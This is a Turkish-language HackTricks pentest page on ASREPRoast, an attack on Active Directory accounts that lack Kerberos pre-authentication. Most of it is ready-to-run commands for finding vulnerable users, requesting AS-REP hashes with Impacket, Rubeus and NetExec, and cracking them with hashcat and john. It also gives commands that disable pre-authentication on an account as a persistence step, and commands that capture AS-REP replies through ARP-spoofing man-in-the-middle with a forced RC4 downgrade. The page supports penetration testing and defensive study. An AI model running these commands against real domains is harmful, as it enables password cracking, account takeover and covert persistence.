# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast, **Kerberos pre-authentication required attribute** özelliğine sahip olmayan kullanıcıları hedef alan bir security attack'tir. Temel olarak bu vulnerability, attacker'ların kullanıcının password'üne ihtiyaç duymadan Domain Controller'dan (DC) bir kullanıcı için authentication request göndermesine olanak tanır. DC daha sonra kullanıcının password'ünden türetilen key ile şifrelenmiş bir message gönderir. Attacker'lar, kullanıcının password'ünü keşfetmek için bu message'ı offline olarak crack etmeyi deneyebilir.

Bu attack için temel gereksinimler şunlardır:

- **Kerberos pre-authentication eksikliği**: Hedef kullanıcıların bu security özelliği etkinleştirilmemiş olmalıdır.
- **Domain Controller'a (DC) bağlantı**: Attacker'ların request göndermek ve şifrelenmiş message'ları almak için DC'ye erişmesi gerekir.
- **İsteğe bağlı domain account**: Bir domain account'a sahip olmak, attacker'ların LDAP query'leri aracılığıyla vulnerable kullanıcıları daha verimli şekilde belirlemesini sağlar. Böyle bir account olmadan attacker'lar username'leri tahmin etmek zorundadır.

#### Vulnerable kullanıcıları enumerate etme (domain credentials gerekli)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP Mesajı
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus varsayılan olarak **RC4** ister; bu nedenle Event ID **4768** genellikle **preauth type 0** ve **ticket encryption type 0x17** gösterir. **`/aes`** eklerseniz (veya hedef için RC4 devre dışıysa) bunun yerine **AES etypes** bekleyin.<sup>[[2]](#references)</sup>

#### Hızlı one-liner'lar (Linux)

- Olası hedefleri önce (ör. leaked build path'lerden) Kerberos userenum ile enumerate edin: `kerbrute userenum users.txt -d domain --dc dc.domain`
- NetExec kullanarak geçerli creds olmadan tüm username listesini roast edin: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Creds'iniz varsa NetExec'in LDAP'ı sorgulamasına ve roastable tüm hesapları sizin için istemesine izin verin: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Çıktı **`$krb5asrep$23$`** ile başlıyorsa Hashcat **`-m 18200`** ile crack edin. **`$krb5asrep$17$`** veya **`$krb5asrep$18$`** ile başlıyorsa John **`--format=krb5asrep`** kullanmayı tercih edin.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Her AS-REP roast'un RC4 olduğunu varsaymayın. Modern tooling, istenen/negotiated enctype'e bağlı olarak **RC4** (`$krb5asrep$23$`) veya **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) döndürebilir. **`hashcat -m 18200`**, **etype 23** içindir; **John** ise `krb5asrep` değerlerini **17/18/23** için doğrudan işler.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Kalıcılık

**GenericAll** izinlerine (veya özellik yazma izinlerine) sahip olduğunuz bir kullanıcı için **preauth** gerektirilmemesini sağlayın:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## Kimlik bilgileri olmadan ASREProast

Bir saldırgan, Kerberos pre-authentication devre dışı bırakılmasına gerek kalmadan, ağ üzerinden iletilen AS-REP paketlerini yakalamak için man-in-the-middle konumunu kullanabilir. Bu nedenle VLAN üzerindeki tüm kullanıcılar için çalışır.\
No-preauth principal'dan **TGT** yerine **service ticket** döndüren ilgili no-credential tekniğini istiyorsanız, bkz. [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bunu yapmamızı sağlar. `relay` modu, client hâlâ **etype 23** reklamı yaparken **RC4**'ü zorlayabildiği için offensive açıdan ilgi çekici olandır; `listen` ise pasif kalır ve yalnızca client/DC tarafından negotiate edilen şeyi yakalar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
